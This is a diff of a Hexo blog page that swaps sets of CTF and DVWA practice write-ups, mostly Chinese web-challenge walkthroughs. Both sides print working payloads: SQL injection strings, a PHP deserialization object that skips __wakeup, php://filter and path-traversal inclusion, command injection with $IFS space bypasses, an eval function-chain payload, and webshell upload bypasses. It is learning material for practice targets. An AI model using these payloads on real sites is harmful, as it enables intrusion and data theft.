@@ -71,10 +71,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-page-44" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-page-57" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/05/03/page-44/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:58:34.000Z" itemprop="datePublished">2021-05-03</time>
+    <a href="/2021/07/08/page-57/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:44:23.000Z" itemprop="datePublished">2021-07-08</time>
 </a>
     
   </div>
@@ -85,7 +85,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-44/">刷题2</a>
+      <a class="p-name article-title" href="/2021/07/08/page-57/">GXYCTF2019禁止套娃源码</a>
     </h1>
   
 
@@ -93,57 +93,45 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p><strong>[极客大挑战 2019]Http 1</strong>   这关用burp改一改就能出flag   右键看源码发现别的页面 提示访问来源不对 那就改一下referer头来伪造那边提示的那个网页<br>然后还得改一下用什么浏览器访问的 Syclover这个浏览器<br>然后又要求要本地那就再添加一段X-Forwarded-For 127.0.0.1 就可以拿到flag </p>
-<p><strong>[极客大挑战 2019]PHP 1</strong>  这关扫一扫发现有个叫<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 访问后下载下来一个zip解压可以看到 class.php flag.php(当然这个打开啥都没有） 剩下一些无关紧要的<br>class是个序列化操作<br>class Name{<br>    private $username = ‘nonono’;<br>    private $password = ‘yesyes’;</p>
-<pre><code>public function __construct($username,$password)&#123;
-    $this-&gt;username = $username;
-    $this-&gt;password = $password;
-&#125;
-
-function __wakeup()&#123;
-    $this-&gt;username = &#39;guest&#39;;
-&#125;
-
-function __destruct()&#123;
-    if ($this-&gt;password != 100) &#123;
-        echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
-        echo &quot;You name is: &quot;;
-        echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;You password is: &quot;;
-        echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
-        die();
-    &#125;
-    if ($this-&gt;username === &#39;admin&#39;) &#123;
-        global $flag;
-        echo $flag;
-    &#125;else&#123;
-        echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;
-        die();
-</code></pre>
-<p>​<br>​        }<br>​    }<br>}<br>?&gt;  </p>
-<p> 一个叫做name 然后里头又有七七八八的 但是如果是username=admin ；password=100 可以访问 那么搞一个反序列化的操作<br>首先要知道username=admin ；password=100 生成的序列是什么<br>构造 </p>
+        <p><strong>这题有个git泄露   url后头加个.git 然后丢到githacker 下载下来源代码</strong></p>
 <?php
-
-class Name{
-    private $username = 'nonono';
-    private $password = 'yesyes';
-
-    public function __construct($username,$password){
-        $this->username = $username;
-        $this->password = $password;
+include "flag.php";
+echo "flag在哪里呢？<br>";
+if(isset($_GET['exp'])){       ；典型的木马get方式  
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {    ；这边常用伪协议均被禁止了就很离谱 
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {        ；这边正则匹配 ？R表示引用当前表达式  [a-z,_]+[a-z,_]+\((?R)?\)  合法表达式类似于a(b();) 
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {   ；过滤一些字眼
+                // echo $_GET['exp'];
+                @e、、v、、a、、l($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
     }
-
+    else{
+        die("还想读flag，臭弟弟！");
+    }
 }
-$a = new Name('admin', 100);
-var_dump(serialize($a));
+// highlight_file(__FILE__);
+?>
 
-?><p> 然后浏览器解析一下得到 O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}<br>但是反序列化会执行_wakeup()这个函数 那么就得再次跳过这个<br>O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行<br> private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度<br>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}<br>然后配合一开始zip里面的index 构造?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;} 成功 </p>
-<p><strong>[极客大挑战 2019]BabySQL 1</strong> 这关 过滤了组合拳的诸多 union select  or and from where 这几个词都被过滤双写绕过<br>union-&gt;ununionion select-&gt;selselectect or-&gt;oorr  from-&gt;frofromm  where-&gt;whewhereere  就是一套组合拳就可以了<br><strong>ACTF2020 新生赛]Upload 1</strong> 发现网页前端就有checkfile的那个玩意  用火狐浏览器直接删掉那段话 然后就上传eval 后门了 但是还得绕 php不过得改成phtml就可以了 然后连接 ok</p>
+<p>然其不能使用php伪协议，<strong>但是@e、、v、、a、、l($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录</strong>  ╮(╯▽╰)╭这顿号加的很无奈 不然到时候又被杀了</p>
+<ul>
+<li><strong>scandir</strong>  (语法scandir（dictionary，sorting_order,context);)    使用至少必需要有一个directory的，但是我们又没有办<strong>法去定义一个变量，这时候就要考虑php有没有什么函数是自带常量的</strong>：localeconv()  (这玩意是个数组 然后就得用到current()  这函数就自带常量  current语法current(array)</li>
+</ul>
+<p>构造一下就是array(localeconv)   </p>
+<p>在构造一下就是?exp=print_r(scandir(current(localeconv())));      然后目录爆出来</p>
+<p>这波还需要用到<strong>next函数将内部指针指向数组的下一个元素并输出.</strong></p>
+<p><strong>正常next</strong>需要用到挺多次的 然而scandir函数的返回值是一个数组，如果把<strong>数组逆序排列</strong>，再用一个<strong>next</strong>即可达成目的<br>然后就是<strong>用到array_reverse</strong>这个神奇的函数：以相反的元素按顺序返回数组<br>然后最后<strong>highlight_file 输出文件即可</strong><br>payload：?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-44/" data-id="ckrosnlug000smow7d41nboke" data-title="刷题2" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/07/08/page-57/" data-id="ckrosnlum0012mow70mc50pis" data-title="GXYCTF2019禁止套娃源码" class="article-share-link">Share</a>
       
       
       
@@ -155,10 +143,10 @@ var_dump(serialize($a));
 
 
   
-    <article id="post-page-43" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-page-56" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/05/03/page-43/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:58:31.000Z" itemprop="datePublished">2021-05-03</time>
+    <a href="/2021/07/08/page-56/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:35:08.000Z" itemprop="datePublished">2021-07-08</time>
 </a>
     
   </div>
@@ -169,7 +157,7 @@ var_dump(serialize($a));
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-43/">刷题1</a>
+      <a class="p-name article-title" href="/2021/07/08/page-56/">BSidesCF2020Had a badday1</a>
     </h1>
   
 
@@ -177,563 +165,422 @@ var_dump(serialize($a));
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p><strong>[HCTF 2018]WarmUp 1</strong> 文件包含 这个按了下f12发现跳出了源码 $whitelist数组有两个值 一个source.php 一个hint.php 进入hint试一下 告诉我们flag在ffffllllaaaagggg中 但是一般来说没法直接访问 源码还有一部分<br> if (! empty($_REQUEST[‘file’])  //$_REQUEST[‘file’]值非空<br>        &amp;&amp; is_string($_REQUEST[‘file’])  //$_REQUEST[‘file’]值为字符串<br>        &amp;&amp; emmm::checkFile($_REQUEST[‘file’])  //能够通过checkFile函数校验<br>    ) {<br>        include $_REQUEST[‘file’];  //包含$_REQUEST[‘file’]文件<br>        exit;<br>    } else {<br>        echo “<br>&lt;img src=&quot;<a target="_blank" rel="noopener" href="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg/&quot;">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot;</a> /&gt;”;<br>        //打印滑稽表情<br>    }   要传入file 首先不能为空 类型为字符串 能通过checkFile()函数<br> highlight_file(<strong>FILE</strong>); //打印代码<br>    class emmm  //定义emmm类<br>    {<br>        public static function checkFile(&amp;$page)//将传入的参数赋给$page<br>        {<br>            $whitelist = [“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];//声明$whitelist（白名单）数组<br>            if (! isset($page) || !is_string($page)) {//若$page变量不存在或非字符串<br>                echo “you can’t see it”;//打印”you can’t see it”<br>                return false;//返回false<br>            }</p>
-<pre><code>        if (in_array($page, $whitelist)) &#123;//若$page变量存在于$whitelist数组中
-            return true;//返回true
-        &#125;
+        <p>url有点类似伪协议<br>?categery 这个和php伪协议有点像<br>试一下伪协议     可以获取到源代码 的base64   </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/2.PNG?raw=true" alt="2.PNG"></p>
+<p>解码也没找出什么东西但是吧发现可以用来读取东西<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/3.PNG?raw=true" alt="3.PNG"></p>
+<p>这边可以读到图片的base64后的结果</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/4.PNG?raw=true" alt="4.PNG"></p>
+<p>那么这样就拿到flag了</p>
 
-        $_page = mb_substr(//该代码表示截取$page中&#39;?&#39;前部分，若无则截取整个$page
-            $page,
-            0,
-            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
-        );
-        if (in_array($_page, $whitelist)) &#123;
-            return true;
-        &#125;
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-56/" data-id="ckrosnlum0011mow72dmd8yq0" data-title="BSidesCF2020Had a badday1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
-        $_page = urldecode($page);//url解码$page
-        $_page = mb_substr(
-            $_page,
-            0,
-            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
-        );
-        if (in_array($_page, $whitelist)) &#123;
-            return true;
-        &#125;
-        echo &quot;you can&#39;t see it&quot;;
-        return false;
+
+
+  
+    <article id="post-page-55" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/06/11/page-55/" class="article-date">
+  <time class="dt-published" datetime="2021-06-11T13:30:26.000Z" itemprop="datePublished">2021-06-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/06/11/page-55/">page</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>a这我真的找不出哪边语法错误怎么改都提示错误┗|｀O′|┛ <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/234.PNG?raw=true" alt="234.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/233.PNG?raw=true" alt="233.PNG"></p>
+<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/sssq.PNG?raw=true" alt="sssq.PNG"></p>
+<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/235.PNG?raw=true" alt="235.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/06/11/page-55/" data-id="ckrosnluk0010mow76v01h2qn" data-title="page" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-54" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/06/11/page-54/" class="article-date">
+  <time class="dt-published" datetime="2021-06-11T12:43:01.000Z" itemprop="datePublished">2021-06-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/06/11/page-54/">page[ASIS 2019]Unicornshop1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>抓包<strong>网页编码格式utf-8</strong> 这个很重要</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/113.PNG?raw=true" alt="113.PNG"></p>
+<p>根据题目的提示，这题应该和unicode有关  寻找一个unicode 用来是金额的</p>
+<p>这里  <strong>post数据id=1&amp;price=23</strong>  这边如果都是数字会提示错误 所有price只能用Unicode 表示 </p>
+<p>找一个足够大的 <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/112.PNG?raw=true" alt="112.PNG"></p>
+<p>然后会发现1 2 3 都没法买</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/111.PNG?raw=true" alt="111.PNG"></p>
+<p>到4 就可以了 </p>
+<p>这边得用utf-8编码的格式进行输入 然后还得改成 url编码0x改成%即可 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/06/11/page-54/" data-id="ckrosnluj000ymow7hqmgb0od" data-title="page[ASIS 2019]Unicornshop1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/06/11/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2021-06-11T09:19:15.345Z" itemprop="datePublished">2021-06-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/06/11/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/06/11/hello-world/" data-id="ckrosnlu40007mow73x1f9wg6" data-title="Hello World" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-53" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/05/27/page-53/" class="article-date">
+  <time class="dt-published" datetime="2021-05-27T06:59:00.000Z" itemprop="datePublished">2021-05-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/05/27/page-53/">那啥ciscn2021杂项的running pixel</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>奔跑的像素点蛤？</p>
+<p>跑？ 把所有的帧给提取出来</p>
+<p>丢Stegsolve 里头看了看 red plane3 看了看 都有一个点比较另类的</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/aaa.jpg?raw=true" alt="aaa.jpg"><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/ccc.jpg?raw=true" alt="ccc.jpg"></p>
+<p>然后ps看这个点的像素值总会含有这个RGB: 233,233,233的像素块  部分像素颜色为233，233，233将颜色为233，233，233区块的位置尝试画出来 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/ddd.jpg?raw=true" alt="ddd.jpg"></p>
+<p>from PIL import Image</p>
+<p>flag_img = Image.new(‘1’,(400,400))<br>#mode=1 1位黑白像素，每字节存储一个像素<br>for name in range(10,383):    #这边应给得从1开始<br>    framepic = Image.open(‘0_f’+str(name)+’.gif’)   #然后这边0_f0 应该为这样 跑完前十张图后改称这样<br>    framepic = framepic.convert(“RGB”)<br>    width,height = framepic.size<br>    for w in range(width):<br>        for h in range(height):<br>            if framepic.getpixel((w,h)) == (233,233,233):<br>                flag_img.putpixel((h,w),1)</p>
+<p>flag_img.save(‘./flag/‘+str(name)+’.png’)     （从别的大佬那拿来的脚本）</p>
+<p>和刚才的所有的导出的帧数放在同一个文件夹 跑完程序就<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/bbb.jpg?raw=true" alt="bbb.jpg">可以了  </p>
+<p>得到这张图慢慢拼图就能拿到flag了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/27/page-53/" data-id="ckrosnluj000zmow74ue849i0" data-title="那啥ciscn2021杂项的running pixel" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-52" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/05/27/page-52/" class="article-date">
+  <time class="dt-published" datetime="2021-05-27T05:15:22.000Z" itemprop="datePublished">2021-05-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/05/27/page-52/">ciscn robot</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>其实包里面给了这么多东西就只有那个抓包文件有用 其他的不会用</p>
+<p>.pcapng那个文件里面Value.[62,49,0] 有好多这种样子的总共<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/sss.PNG?raw=true" alt="sss.PNG"></p>
+<p>这么多个可以试着把这些点抓出来然后python画图一下</p>
+<p>这个先另存txt先</p>
+<p>from PIL import Image<br>import re</p>
+<p>reg = re.compile(r’Value.[(\d+),(\d+),(\d+)]‘)  ;正则匹配符合的项</p>
+<p>with open(‘ro.txt’,’r’) as f:<br>data = reg.findall(f.read())<br># print(data)<br># print(len(data))</p>
+<p>img = Image.new(‘1’, (400, 400))<br>for i in data:<br>xy = (int(i[0]), int(i[1]))<br>img.putpixel(xy, 1)<br>img.save(“md5flag.png”)</p>
+<p>这边ro.txt 和MD5flag.png 自己命名去</p>
+<p>运行一下可以生成图片</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/md5flag.png?raw=true" alt="md5flag.png"></p>
+<p>然后图片内容MD5加密一下就是flag</p>
+<p>但这可能不是预期解法就是了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/27/page-52/" data-id="ckrosnlui000wmow75xa1398k" data-title="ciscn robot" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-aaa" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/05/26/aaa/" class="article-date">
+  <time class="dt-published" datetime="2021-05-26T13:47:03.000Z" itemprop="datePublished">2021-05-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/05/26/aaa/">那啥ciscn2021杂项的running pixel</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>奔跑的像素点蛤？</p>
+<p>跑？ 把所有的帧给提取出来</p>
+<p>丢Stegsolve 里头看了看 red plane3 看了看 都有一个点比较另类的<img src="%5Caaa%5Caaa.jpg" alt="aaa"></p>
+<p><img src="%5Caaa%5Cccc.jpg" alt="ccc"></p>
+<p>然后ps看这个点的像素值总会含有这个RGB: 233,233,233的像素块  部分像素颜色为233，233，233将颜色为233，233，233区块的位置尝试画出来 </p>
+<p><img src="%5Caaa%5Cddd.jpg" alt="ddd"></p>
+<p>from PIL import Image</p>
+<p>flag_img = Image.new(‘1’,(400,400))<br>#mode=1 1位黑白像素，每字节存储一个像素<br>for name in range(10,383):    #这边应给得从1开始<br>    framepic = Image.open(‘0_f’+str(name)+’.gif’)   #然后这边0_f0 应该为这样 跑完前十张图后改称这样<br>    framepic = framepic.convert(“RGB”)<br>    width,height = framepic.size<br>    for w in range(width):<br>        for h in range(height):<br>            if framepic.getpixel((w,h)) == (233,233,233):<br>                flag_img.putpixel((h,w),1)</p>
+<p>flag_img.save(‘./flag/‘+str(name)+’.png’)</p>
+<p>和刚才的所有的帧数放在同一个文件夹 跑完程序就可以了  <img src="%5Caaa%5Cbbb.jpg" alt="bbb"></p>
+<p>慢慢拼图就能拿到flag了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/26/aaa/" data-id="ckrosnlu10002mow7bsag8pnu" data-title="那啥ciscn2021杂项的running pixel" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-47" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/05/03/page-47/" class="article-date">
+  <time class="dt-published" datetime="2021-05-02T23:59:01.000Z" itemprop="datePublished">2021-05-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/05/03/page-47/">dvwa 文件上传</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>low 直接上传后门文件检查都不检查的</p>
+<p>medium 上传的时候用jpg 然后burp改或者直接php 然后burp从Content-Type 那边改image/jpeg </p>
+<p>high 上传图片马然后用文件包含漏</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/03/page-47/" data-id="ckrosnluh000vmow7g65e74ty" data-title="dvwa 文件上传" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-46" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/05/03/page-46/" class="article-date">
+  <time class="dt-published" datetime="2021-05-02T23:58:56.000Z" itemprop="datePublished">2021-05-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/05/03/page-46/">刷题4</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>[网鼎杯2018]fakebook题解</strong>  先注册一个 然后发现/view.php?no=1 貌似可以sql注入?no=-1 显示了Notice: Trying to get property of non-object in /var/www/html/view.php on line 53 数字型 的所有就?no=0  扫后台发现robots.txt 然后又发现一个user.php.bak   可以大概猜一猜flag位置<br>然后这又是一个序列化题目<br>&lt;?php</p>
+<p>class UserInfo<br>{<br>    public $name = “aaad”;<br>    public $age = 19;<br>    public $blog = “file:///var/www/html/flag.php”;</p>
+<pre><code>public function __construct($name, $age, $blog)
+&#123;
+    $this-&gt;name = $name;
+    $this-&gt;age = (int)$age;
+    $this-&gt;blog = $blog;
+&#125;
+
+function get($url)
+&#123;
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $output = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    if($httpCode == 404) &#123;
+        return 404;
     &#125;
-&#125;  这边还有这段代码
+    curl_close($ch);
+
+    return $output;
+&#125;
+
+public function getBlogContents ()
+&#123;
+    return $this-&gt;get($this-&gt;blog);
+&#125;
+
+public function isValidBlog ()
+&#123;
+    $blog = $this-&gt;blog;
+    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
+&#125;
 </code></pre>
-<p>第一个if语句对变量进行检验，要求$page为字符串，否则返回false<br>第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true<br>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true<br>第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br>若以上四个if语句均未返回值，则返回false<br> 用文件包含  。。。。/source.php?file=source.php?../ffffllllaaaagggg  无返回值那就再加../多加几个说不定就出来了 最后总共五个就有显示flag </p>
-<p><strong>[极客大挑战 2019]EasySQL 1</strong>  sql注入 用个union select 就出来了  随便输入一个用户名 aaa’ union select 1,2,3 # 密码aaa 这关就很水 直接就显示flag了╮(╯▽╰)╭<br><strong>[极客大挑战 2019]Havefun 1</strong>  sql注入  看源码<br>$cat=$_GET[‘cat’];<br>        echo $cat;<br>        if($cat==’dog’){<br>            echo ‘Syc{cat_cat_cat_cat}’;  就试一下在后面加个?cat=dog  ok flag显示了<br><strong>[SUCTF 2019]EasySQL 1</strong>  sql注入 堆叠注入 输入1;show databases;show tables; 显示了一些东西但是没法查columns里面的数据 据说这关泄露的源码 但是我没找出来 所以看了下别人找出来的<br> $BlackList = “prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|&quot;“;  很长的一串黑名单 但是没过滤* 直接select就完事了 输入*,1;<br>因为内置的sql语句sql=”select”.sql=”select”.post[‘query’].”||flag from Flag”;  就直接给了flag了<br><strong>[ACTF2020 新生赛]Include 1</strong>    这个页面右键看了下源码?file=flag 文件包含构造了一手pyload: ?file=php://filter/read=convert.base64-encode/resource=flag.php 出来一段base64 编码的东西解码一下就得到flag了<br> <strong>[极客大挑战 2019]Secret File 1</strong>          这个什么蒋璐源的秘密的 右键源码发现还有别的页面 点进去另一个页面 点了下secret 就没了what？∑( 口 || 老子看都没看就没了 用burp抓一下有secret的那个页面 然后转到repeater那边重发一波 又一波<br>发现了一个secr3t.php，访问 然后用上一关用过的神奇操作在后面加个<br>?file=php://filter/read=convert.base64-encode/resource=flag.php 得到一串 解码一波就能得到flag<br><strong>[极客大挑战 2019]LoveSQL 1</strong> sql注入 那一套组合拳 用union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()# 这个顺序变一下 然后union select 1,2,group_concat(id,username,password) from (表名叫什么来着忘了） 反正就能得到flag了<br><strong>[GXYCTF2019]Ping Ping Ping 1</strong>  命令行注入 那么就用127.0.0.1 他的本机ip来搞他  127.0.0.1;ls 显示还有index.php flag.php<br>127.0.0.1;cat flag.php 显示fxck your space！ 过滤了空格 注：%20(space)、%09(tab)、$IFS$9、${IFS}$9、 {IFS}、IFS 都可以用来绕过过滤了空格的操作 可以试一下打开index.php的文件构造?ip=127.0.0.1;cat$IFS$1index.php 查看过滤名单<br>  构造/?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php  即可获取flag 注：此处将变量ab的位置互换是为了绕过字符串匹配<br>          3.内联执行 （真正的大佬操作，给跪了）</p>
